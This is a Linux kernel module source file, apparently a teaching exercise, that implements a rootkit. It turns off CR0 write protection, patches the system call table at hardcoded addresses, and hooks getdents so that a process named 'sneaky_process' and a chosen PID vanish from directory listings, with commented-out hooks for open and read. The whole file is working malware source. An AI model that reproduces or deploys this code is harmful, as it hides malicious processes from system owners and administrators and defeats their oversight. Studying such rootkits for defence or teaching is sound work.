

#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

//ffffffff81077be0 T set_pages_ro
//ffffffff81077c50 T set_pages_rw
//ffffffff81e001a0 R sys_call_table


#define BUFFLEN 512
MODULE_LICENSE("GPL");


//get sneaky process id
//Documentation - http://www.tldp.org/LDP/lkmpg/2.6/html/x323.html
//set module parameters

static char * sneaky_process_id = "";
module_param(sneaky_process_id, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(sneaky_process_id, "sneaky_process pid");

//getdents will fill in an array of “struct linux_dirent” objects, one for each file or directory found within a directory. 
//int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
struct linux_dirent {
            u64            d_ino;
            s64            d_off;
            unsigned short d_reclen;
            char           d_name[BUFFLEN];
};

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81077c50;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81077be0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81e001a0;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.


//asmlinkage int (*original_read)(int fd, void * buf, size_t count); //for read syscall
//asmlinkage int (*original_open)(const char *pathname, int flags); //for open syscall
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count); //for getdents syscall




//Define our new sneaky version of the 'open' syscall
/*asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  printk(KERN_INFO "Very, very Sneaky!\n");
  return original_open(pathname, flags);
}*/


//Define our new sneky version of the 'getdents' syscall
//Code based on http://man7.org/linux/man-pages/man2/getdents.2.html

asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

  //First we call the original system call
  int num = original_getdents(fd, dirp, count);
  struct linux_dirent * curr_dir;
  int var = 0; //current position in bytes
  unsigned short reclen;
  
  while (var < num){

    curr_dir = (struct linux_dirent *)(var + (char*)(dirp));
    reclen = curr_dir->d_reclen; //get length of current directory

    //Found file to hide
    if(strcmp("sneaky_process", curr_dir->d_name) == 0 || (strcmp(sneaky_process_id, curr_dir->d_name) == 0)){
	char * next_dir = (char *)curr_dir + reclen;
	size_t len = (size_t)num - (size_t)(((char *)curr_dir + reclen) - (char*)dirp);
	memcpy(curr_dir, next_dir, len);
	num = num - reclen;
	break;
    }
    
    //update var and current dirent
    var += reclen;
    // current = (struct linux_dirent *)((char *)dirp + reclen);  
  }

  return num;

}





//Define our new sneaky_version of the 'read' syscall
asmlinkage int sneaky_sys_read(int fd, void * buf, size_t count){
  return 0;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.

  //for getdents
  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
 
  //for open
  // original_open = (void*)*(sys_call_table + __NR_open);
  //*(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  //for read
  //original_read = (void*)*(sys_call_table + __NR_read);
  //*(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

   
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  
  //*(sys_call_table + __NR_open) = (unsigned long)original_open;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  //*(sys_call_table + __NR_read) = (unsigned long)original_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  